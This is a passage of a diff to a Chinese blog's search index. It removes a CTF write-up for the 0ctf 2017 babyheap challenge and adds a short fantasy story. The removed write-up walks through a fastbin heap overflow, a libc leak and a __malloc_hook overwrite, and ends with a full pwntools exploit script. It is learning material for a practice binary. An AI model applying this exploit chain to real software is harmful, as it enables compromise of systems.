-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alloc(0x10) #index = 0</span><br><span class="line">alloc(0x10) #index = 1</span><br><span class="line">alloc(0x10) #index = 2</span><br><span class="line">alloc(0x10) #index = 3</span><br><span class="line">alloc(0x80) #index = 4</span><br></pre></td></tr></table></figure>
-<p>此时堆的情况如下<br><img src="/pic/Pasted image 20230814140742.png" alt=""></p>
-</li>
-<li><p>Free掉index为1和2的chunk，给后面alloc留出空间</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">free(1)</span><br><span class="line">free(2)</span><br></pre></td></tr></table></figure>
-<p>heap情况如下<br><img src="/pic/Pasted image 20230814141436.png" alt=""><br>bin情况如下<br><img src="/pic/Pasted image 20230814141724.png" alt=""></p>
-</li>
-<li><p>堆溢出，操控fastbin</p>
-<ol>
-<li>现在是main_arena_fastbin_0x20 —-&gt; chunk2 —-&gt;chunk1</li>
-<li>我们想办法让它变成 xxx_0x20 —-&gt; chunk2 —-&gt;chunk4<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = (p64(0)*3 +p64(0x21))*2 + p8(0x80)</span><br><span class="line">fill(0,payload)</span><br></pre></td></tr></table></figure>
-（这里读者可以自己gdb.attach用bin命令去查看fastbin前后的状态）</li>
-</ol>
-</li>
-<li><p>由于从fastbin申请chunk时会检查fastbin中chunk的size，如果不匹配则报错，所以我们要通过堆溢出修改chunk4的size，让其从0x91变为0x21</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = p64(0)*3 + p64(0x21)</span><br><span class="line">fill(3,payload)</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>申请两个大小为0x10的chunk，可以看到<code>原chunk1</code>指向了<code>原chunk2的地址</code>，<code>原chunk2</code>指向了<code>原chunk4的地址</code>，这样我们就有两个指针指向chunk4了，可以用一个指针来释放，一个指针来读取，方便阅读我们分别命名为pointer_chunk4和pointer_chunk2</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alloc(0x10)</span><br><span class="line">alloc(0x10)</span><br></pre></td></tr></table></figure>
-<p>heap情况如下<br><img src="/pic/Pasted image 20230814143302.png" alt=""></p>
-</li>
-<li><p>直接用pointer_chunk4释放chunk4，ptmalloc会因为找不到topchunk而报错。所以我们应该恢复chunk4的size到0x91再free，但这样会导致chunk4直接跟topchunk合并。所以我们要先恢复chunk4的size到0x91再申请一个0x80大小的堆块隔离topchunk再free</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = p64(0)*3 + p64(0x91)</span><br><span class="line">fill(3,payload)</span><br><span class="line">alloc(0x80)</span><br><span class="line">free(4)</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>此时chunk4的fd和bk就已经存放着一个地址了，我们通过pointer_chunk2来把他读出来<br><img src="/pic/Pasted image 20230814144704.png" alt=""></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dump(2)</span><br><span class="line">libc_base = u64(io.recv(16)[-8:])-0x3c4b78</span><br><span class="line">print(&quot;libc_base   ---&gt;   &quot;,hex(libc_base))</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>我们现在有了libc的地址，下一步是劫持malloc_hook。由于我们要通过fastbin来再malloc_hook处申请堆块，所以我们要通过fastbin对于size的检验，所以看一下malloc_hook前面有没有我们能够申请堆块的地方<br><img src="/pic/Pasted image 20230814145721.png" alt=""><br>发现aed处的0x0000007f符合fastbin的空间，所以我们用libc_base+0x3c4aed(这个用当前地址减去基地址即可算出)来申请<br>⚠这里图aed写错了，而且不应该看这个界面，整体上的chunk应该是</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aed  0x----------------(prev_size) 0x000000000000007f(size)</span><br><span class="line">afd  ---------------------user_data-----------------------</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alloc(0x60)                                    # 将unsortedbin中的chunk4切0x60大小申请出来</span><br><span class="line">free(4)                                        # 把chunk4放到fastbin中，便于用pointer_chunk2操控</span><br><span class="line">payload = p64(libc_base+0x3c4aed)              # 把申请块写进malloc_hook前面</span><br><span class="line">fill(2,payload)                                # 这一步后，fastbin: main_arena ---&gt; chunk4 ---&gt; _ + 0x3c4aed</span><br><span class="line">alloc(0x60)                                    # 把chunk4申请回来</span><br><span class="line">alloc(0x60)                                    # 在malloc_hook处构造堆，index=6</span><br></pre></td></tr></table></figure>
-<ol>
-<li><p>我们修改chunk6的内容，即修改malloc_hook，我们用og来提权</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = b&#x27;a&#x27;*19 + p64(libc_base + 0x4526a)</span><br><span class="line">fill(6,payload)</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>若malloc_hook不为空，再申请堆时会先调用malloc_hook处的函数，所以随便申请即可cat flag</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alloc(255)</span><br></pre></td></tr></table></figure>
-</li>
-</ol>
-<h3 id="Ⅲ-完整EXP"><a href="#Ⅲ-完整EXP" class="headerlink" title="Ⅲ. 完整EXP"></a>Ⅲ. 完整EXP</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">domain_name = &#x27;node4.buuoj.cn&#x27;</span><br><span class="line">port = 25970</span><br><span class="line">file = &#x27;./babyheap_0ctf_2017&#x27;</span><br><span class="line">  </span><br><span class="line"># io = remote(domain_name,port)</span><br><span class="line">io = process(file)</span><br><span class="line"># gdb.attach(io,&#x27;b main&#x27;)</span><br><span class="line">  </span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">def alloc(size):</span><br><span class="line">    io.sendlineafter(&#x27;Command: &#x27;, str(1))</span><br><span class="line">    io.sendlineafter(&#x27;Size: &#x27;, str(size))</span><br><span class="line">  </span><br><span class="line">def fill(index, content):</span><br><span class="line">    io.sendlineafter(&#x27;Command: &#x27;, str(2))</span><br><span class="line">    io.sendlineafter(&#x27;Index: &#x27;, str(index))</span><br><span class="line">    io.sendlineafter(&#x27;Size: &#x27;, str(len(content)))</span><br><span class="line">    io.sendlineafter(&#x27;Content: &#x27;,content)</span><br><span class="line">  </span><br><span class="line">def free(index):</span><br><span class="line">    io.sendlineafter(&#x27;Command: &#x27;, str(3))</span><br><span class="line">    io.sendlineafter(&#x27;Index: &#x27;,str(index))</span><br><span class="line">  </span><br><span class="line">def dump(index):</span><br><span class="line">    io.sendlineafter(&#x27;Command: &#x27;, str(4))</span><br><span class="line">    io.sendlineafter(&#x27;Index: &#x27;, str(index))</span><br><span class="line">    io.recvline()</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(0x10)</span><br><span class="line">alloc(0x10)</span><br><span class="line">alloc(0x10)</span><br><span class="line">alloc(0x10)</span><br><span class="line">alloc(0x80)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">free(1)</span><br><span class="line">free(2)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">payload = (p64(0)*3 +p64(0x21))*2 + p8(0x80)</span><br><span class="line">fill(0,payload)</span><br><span class="line">  </span><br><span class="line">payload = p64(0)*3 + p64(0x21)</span><br><span class="line">fill(3,payload)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(0x10)</span><br><span class="line">alloc(0x10)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">payload = p64(0)*3 + p64(0x91)</span><br><span class="line">fill(3,payload)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(0x80)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">free(4)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">dump(2)</span><br><span class="line">libc_base = u64(io.recv(16)[-8:])-0x3c4b78</span><br><span class="line">print(&quot;libc_base   ---&gt;   &quot;,hex(libc_base))</span><br><span class="line">  </span><br><span class="line">gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(0x60)</span><br><span class="line">free(4)</span><br><span class="line">  </span><br><span class="line">payload = p64(libc_base+0x3c4aed)</span><br><span class="line">fill(2,payload)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(0x60)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(0x60)</span><br><span class="line">  </span><br><span class="line">payload = b&#x27;a&#x27;*19 + p64(libc_base + 0x4526a)</span><br><span class="line">fill(6,payload)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(255)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-<h3 id="Ⅳ-一些疑问"><a href="#Ⅳ-一些疑问" class="headerlink" title="Ⅳ. 一些疑问"></a>Ⅳ. 一些疑问</h3><ol>
-<li>__malloc_hook不是在data段中吗？这题开了FULL RELRO为什么可以改啊🤔</li>
-<li>第九步中heap中chunk2的Addr为什么还是40而不是80啊？</li>
-<li>第十步为什么chunk4会跟topchunk合并？是哪个bin的机制？<ol>
-<li>unsortedbin，后向合并</li>
-</ol>
-</li>
-<li><strong><em>为什么非要在aed处申请堆块？</em></strong><ol>
-<li>fastbin指针指向0xaed，说明0xaed-8是size，0xaed-0x10是prev_size，正好伪装chunk</li>
-</ol>
-</li>
-</ol>
+<p>&emsp;&emsp;雨尚未停歇。<br>&emsp;&emsp;派斯坦擦拭着手里白色的长刀，篝火噼啪的声音回响在山洞的深处。这里是海特山峰的林线，连绵不断的小雨让森林蔓延到极高的海拔，也让覆盖着土壤的地面化为泥沼。<br>&emsp;&emsp;远处的乌云褪去了夜色，昭示着黎明的到来。<br>&emsp;&emsp;“今天还要向上走吗？”我问道。<br>&emsp;&emsp;派斯坦收起手中擦拭刀具的布，拿起一根架在篝火旁的粗树枝，上面还串着不明生物的肉，经过火焰的炙烤，让人分不出那黑色究竟是炭还是肉本来的颜色。<br>&emsp;&emsp;他自顾自地吃了起来，并没有回答我的问题。看着派斯坦吃得津津有味，我也拿起一串，轻轻撕下一块放在嘴里。<br>&emsp;&emsp;苦涩瞬间在嘴里爆开。炙烤后的肉几乎没有水分，让咀嚼变得十分困难，而且还散发着令人抗拒的味道，我实在难以吃下第二口，便把肉放回了篝火旁。<br>&emsp;&emsp;派斯坦也不在乎，他只是向外走，将覆盖在洞口的枝条掀开一个小角，侧身站在洞穴边缘，小心翼翼地用眼睛观察外面的情况。稍许，他走了回来，开始收拾自己的包裹。<br>&emsp;&emsp;天还只是蒙蒙亮，厚厚的黑云让光线变得更加黯淡。看到派斯坦要离开，我也开始收拾行囊。<br>&emsp;&emsp;“山顶上究竟有什么东西，这么值得你探寻？”我看着派斯坦将煮开的热水倒进杯中，忍不住开口问道。<br>&emsp;&emsp;“不知道。”派斯坦的回答十分简短。<br>&emsp;&emsp;话音刚落，他带上避水斗笠，用长刀挑开枝条向外走去，我没来得及追问，只能快步跟着他走出洞穴。可刚走到泥土上我就迅速陷了下去，就好像这被雨水浸透的泥土要囫囵将我吞噬。我吃力地将脚拔出，却看到派斯坦也正十分困难地前进，我不禁感到担忧，何时才能到达这直耸入云的山巅？<br>&emsp;&emsp;“轰——”一只紫黑色的手臂扬起一大片泥土，从离我们不远的地底伸了出来。这手臂近一人高，手掌能将我的头颅轻易抓起。恐惧填满了我的大脑，让我迅速向洞口跑去，可粘性极强的土壤死死的吸附住我的双腿，让我难以动弹。<br>&emsp;&emsp;突然，那怪物手掌向派斯坦拍去，巨大的响声在我耳旁炸起，随后是溅起的泥水。一击不成，这手臂又开始蠕动，想要脱离泥沼的吸附，向派斯坦横扫过去。<br>&emsp;&emsp;“铮——”长刀出鞘，白色的刀光迅速劈在紫黑色的手掌上，使得黑色的血管瞬间张开一个狰狞的裂缝，血液与碎肉迸溅在派斯坦的斗笠与披风上，而后被渐大的雨势冲洗干净。<br>&emsp;&emsp;那手臂没了动静。<br>&emsp;&emsp;我长舒一口气，却看到派斯坦切下怪物手臂的一块肌肉，在雨水中洗涤干净后装进包里。不愉快的早餐经历迅速涌上脑海，我感到胃中一阵翻涌。<br>&emsp;&emsp;“这山这么危险，为什么还要坚持爬到山顶啊？”为了转移注意力，我又搬出今早的问题。<br>&emsp;&emsp;”不知道，“派斯坦将目光移向我，”可是山脚已经被不断上涨的岁月之海淹没，我到了半山腰，已经没有下山的余地了。我不想沉在无人问津的海底，只好把登顶作为我的理想。“<br>&emsp;&emsp;我并不清楚山脚的情况，只能糊里糊涂地跟着派斯坦继续前行。这几小时的旅途并无危机，山脉也不陡峭，跟着上升的海拔，我们走到了一片旷野。<br>&emsp;&emsp;雨水让能见度变得非常低，可前方似乎浮现出了白色的雪线，这意味着登顶之旅即将迈入新的阶段，而雪地也会比泥沼要好走一些。<br>&emsp;&emsp;”轰——“紫黑色的手臂擦着我的脸颊从地底冒出，巨大的冲击力把我掀翻在地。我惊慌地看向派斯坦，却发现他的身边也冒出了一只怪物手臂。<br>&emsp;&emsp;我想从地上爬起，可是这次泥沼彻底将我粘在地面，倏地，我身边的那只怪物手臂在我眼前迅速放大，我用尽全身力气将自己的手臂抬起，想要抵挡这比我上半身还宽的手掌，却被深深地拍进泥沼当中。<br>&emsp;&emsp;我听见了骨骼碎裂的声音，随后泥水灌进了我的耳朵。我感受到那怪物手掌正迅速握紧，因为周围的泥土正在不断地挤压我的身体。<br>&emsp;&emsp;在意识消散之前，极力向外一瞥——<br>&emsp;&emsp;我看见飘摇的风雪，看见垂暮的旷野，看见挥舞着长刀的派斯坦，用坚定驱散着孤单。  </p>
 ]]></content>
       <categories>
-        <category>Pwn</category>
+        <category>sketch</category>
       </categories>
-      <tags>
-        <tag>WriteUp, Heap</tag>
-      </tags>
   </entry>
   <entry>
     <title>Hexo &amp; Next 博客配置与美化</title>
@@ -448,19 +521,5 @@
       <tags>
         <tag>tech, Blog</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>异世界见闻录(1)</title>
-    <url>/2023/08/04/%E5%BC%82%E4%B8%96%E7%95%8C%E8%A7%81%E9%97%BB%E5%BD%95(1)/</url>
-    <content><![CDATA[<blockquote class="blockquote-center">
-我不想沉在无人问津的海底，只好把登顶作为我的理想
-</blockquote>
-
-<span id="more"></span>
-<p>&emsp;&emsp;雨尚未停歇。<br>&emsp;&emsp;派斯坦擦拭着手里白色的长刀，篝火噼啪的声音回响在山洞的深处。这里是海特山峰的林线，连绵不断的小雨让森林蔓延到极高的海拔，也让覆盖着土壤的地面化为泥沼。<br>&emsp;&emsp;远处的乌云褪去了夜色，昭示着黎明的到来。<br>&emsp;&emsp;“今天还要向上走吗？”我问道。<br>&emsp;&emsp;派斯坦收起手中擦拭刀具的布，拿起一根架在篝火旁的粗树枝，上面还串着不明生物的肉，经过火焰的炙烤，让人分不出那黑色究竟是炭还是肉本来的颜色。<br>&emsp;&emsp;他自顾自地吃了起来，并没有回答我的问题。看着派斯坦吃得津津有味，我也拿起一串，轻轻撕下一块放在嘴里。<br>&emsp;&emsp;苦涩瞬间在嘴里爆开。炙烤后的肉几乎没有水分，让咀嚼变得十分困难，而且还散发着令人抗拒的味道，我实在难以吃下第二口，便把肉放回了篝火旁。<br>&emsp;&emsp;派斯坦也不在乎，他只是向外走，将覆盖在洞口的枝条掀开一个小角，侧身站在洞穴边缘，小心翼翼地用眼睛观察外面的情况。稍许，他走了回来，开始收拾自己的包裹。<br>&emsp;&emsp;天还只是蒙蒙亮，厚厚的黑云让光线变得更加黯淡。看到派斯坦要离开，我也开始收拾行囊。<br>&emsp;&emsp;“山顶上究竟有什么东西，这么值得你探寻？”我看着派斯坦将煮开的热水倒进杯中，忍不住开口问道。<br>&emsp;&emsp;“不知道。”派斯坦的回答十分简短。<br>&emsp;&emsp;话音刚落，他带上避水斗笠，用长刀挑开枝条向外走去，我没来得及追问，只能快步跟着他走出洞穴。可刚走到泥土上我就迅速陷了下去，就好像这被雨水浸透的泥土要囫囵将我吞噬。我吃力地将脚拔出，却看到派斯坦也正十分困难地前进，我不禁感到担忧，何时才能到达这直耸入云的山巅？<br>&emsp;&emsp;“轰——”一只紫黑色的手臂扬起一大片泥土，从离我们不远的地底伸了出来。这手臂近一人高，手掌能将我的头颅轻易抓起。恐惧填满了我的大脑，让我迅速向洞口跑去，可粘性极强的土壤死死的吸附住我的双腿，让我难以动弹。<br>&emsp;&emsp;突然，那怪物手掌向派斯坦拍去，巨大的响声在我耳旁炸起，随后是溅起的泥水。一击不成，这手臂又开始蠕动，想要脱离泥沼的吸附，向派斯坦横扫过去。<br>&emsp;&emsp;“铮——”长刀出鞘，白色的刀光迅速劈在紫黑色的手掌上，使得黑色的血管瞬间张开一个狰狞的裂缝，血液与碎肉迸溅在派斯坦的斗笠与披风上，而后被渐大的雨势冲洗干净。<br>&emsp;&emsp;那手臂没了动静。<br>&emsp;&emsp;我长舒一口气，却看到派斯坦切下怪物手臂的一块肌肉，在雨水中洗涤干净后装进包里。不愉快的早餐经历迅速涌上脑海，我感到胃中一阵翻涌。<br>&emsp;&emsp;“这山这么危险，为什么还要坚持爬到山顶啊？”为了转移注意力，我又搬出今早的问题。<br>&emsp;&emsp;”不知道，“派斯坦将目光移向我，”可是山脚已经被不断上涨的岁月之海淹没，我到了半山腰，已经没有下山的余地了。我不想沉在无人问津的海底，只好把登顶作为我的理想。“<br>&emsp;&emsp;我并不清楚山脚的情况，只能糊里糊涂地跟着派斯坦继续前行。这几小时的旅途并无危机，山脉也不陡峭，跟着上升的海拔，我们走到了一片旷野。<br>&emsp;&emsp;雨水让能见度变得非常低，可前方似乎浮现出了白色的雪线，这意味着登顶之旅即将迈入新的阶段，而雪地也会比泥沼要好走一些。<br>&emsp;&emsp;”轰——“紫黑色的手臂擦着我的脸颊从地底冒出，巨大的冲击力把我掀翻在地。我惊慌地看向派斯坦，却发现他的身边也冒出了一只怪物手臂。<br>&emsp;&emsp;我想从地上爬起，可是这次泥沼彻底将我粘在地面，倏地，我身边的那只怪物手臂在我眼前迅速放大，我用尽全身力气将自己的手臂抬起，想要抵挡这比我上半身还宽的手掌，却被深深地拍进泥沼当中。<br>&emsp;&emsp;我听见了骨骼碎裂的声音，随后泥水灌进了我的耳朵。我感受到那怪物手掌正迅速握紧，因为周围的泥土正在不断地挤压我的身体。<br>&emsp;&emsp;在意识消散之前，极力向外一瞥——<br>&emsp;&emsp;我看见飘摇的风雪，看见垂暮的旷野，看见挥舞着长刀的派斯坦，用坚定驱散着孤单。  </p>
-]]></content>
-      <categories>
-        <category>sketch</category>
-      </categories>
   </entry>
 </search>
